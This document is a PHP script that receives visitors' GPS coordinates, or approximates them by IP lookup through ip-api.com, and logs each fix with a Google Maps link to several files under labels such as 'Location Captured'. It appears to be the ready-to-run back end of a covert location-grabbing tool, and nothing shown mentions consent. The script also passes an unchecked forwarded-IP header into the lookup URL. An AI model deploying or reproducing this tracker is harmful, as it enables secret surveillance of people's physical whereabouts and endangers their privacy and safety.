<?php
$date      = date('dMYHis');
$latitude  = isset($_POST['lat']) ? $_POST['lat'] : '';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : '';
$accuracy  = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';

// ── If GPS was denied, try IP geolocation fallback ────────────────────────────
$ip_geo = '';
if (empty($latitude) || empty($longitude)) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    // Free API — no key required
    $geo_json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,lat,lon,city,regionName,country,isp");
    if ($geo_json) {
        $geo = json_decode($geo_json, true);
        if (isset($geo['status']) && $geo['status'] === 'success') {
            $latitude  = $geo['lat']  ?? '';
            $longitude = $geo['lon']  ?? '';
            $accuracy  = 'IP-based (approx. 10–50 km)';
            $ip_geo    = ($geo['city'] ?? '') . ', ' . ($geo['regionName'] ?? '') . ', ' . ($geo['country'] ?? '') . ' | ISP: ' . ($geo['isp'] ?? '');
        }
    }
}

if (!empty($latitude) && !empty($longitude)) {
    $maps_link = "https://www.google.com/maps/place/{$latitude},{$longitude}";

    $data  = "Latitude: $latitude\r\n";
    $data .= "Longitude: $longitude\r\n";
    $data .= "Accuracy: $accuracy\r\n";
    $data .= "Google Maps: $maps_link\r\n";
    if (!empty($ip_geo)) $data .= "IP Geo Fallback: $ip_geo\r\n";
    $data .= "Date: $date\r\n";

    $file = 'location_' . $date . '.txt';
    file_put_contents($file, $data);
    file_put_contents('current_location.txt', $data);
    file_put_contents('LocationLog.log', "Location captured\n", FILE_APPEND);

    // Master log
    $masterFile = 'saved.locations.txt';
    if (!file_exists($masterFile)) touch($masterFile);
    file_put_contents($masterFile, "\n=== New Location Captured ===\n" . $data . "\n", FILE_APPEND);

    // Copy to saved_locations/
    if (!is_dir('saved_locations')) mkdir('saved_locations', 0755, true);
    copy($file, 'saved_locations/' . $file);

    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Location data received']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}
exit();
?>